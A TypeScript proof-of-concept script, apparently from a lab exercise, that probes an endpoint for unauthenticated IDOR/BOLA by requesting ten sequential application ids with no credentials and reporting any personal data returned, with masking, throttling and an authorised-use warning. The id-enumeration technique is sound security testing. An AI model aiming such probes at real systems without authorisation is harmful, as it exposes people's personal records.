/**
 * Task 1 - unauthenticated IDOR probe (black-box).
 * Sends requests with NO cookie / Authorization header and reports whether personal data comes back.
 *
 *   npx tsx poc/idor_probe.ts [baseUrl] [path]
 *   npx tsx poc/idor_probe.ts http://127.0.0.1:3000 /api/vulnerable/dashboard
 *
 * Use only against systems you own or are explicitly authorised to test.
 * Deliberately gentle: at most 10 ids, 150 ms apart. Output masks personal values.
 */
const base = (process.argv[2] ?? "http://127.0.0.1:3000").replace(/\/$/, "");
const path = process.argv[3] ?? "/api/vulnerable/dashboard";
const IDS = Array.from({ length: 10 }, (_, i) => `DT-2026-${String(i + 1).padStart(3, "0")}`);

const mask = (v: string): string => (v.length <= 2 ? "**" : `${v[0]}${"*".repeat(Math.min(v.length - 2, 6))}${v.at(-1)}`);
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

let exposed = 0;
console.log(`Probing ${base}${path}?appId=<id> with no credentials\n`);
for (const id of IDS) {
  const res = await fetch(`${base}${path}?appId=${id}`); // no cookies, no auth headers
  if (res.status === 200) {
    const body = (await res.json()) as Record<string, string>;
    exposed++;
    console.log(`${id}  HTTP 200  fields=[${Object.keys(body).join(", ")}]  name=${mask(body.name ?? "")}  email=${mask((body.email ?? "").split("@")[0] ?? "")}@...`);
  } else {
    console.log(`${id}  HTTP ${res.status}`);
  }
  await sleep(150);
}
console.log(`\n${exposed} of ${IDS.length} ids returned personal data without authentication.`);
console.log(exposed > 0 ? "RESULT: VULNERABLE (unauthenticated BOLA / IDOR)" : "RESULT: no unauthenticated data exposure observed");
process.exit(exposed > 0 ? 1 : 0);
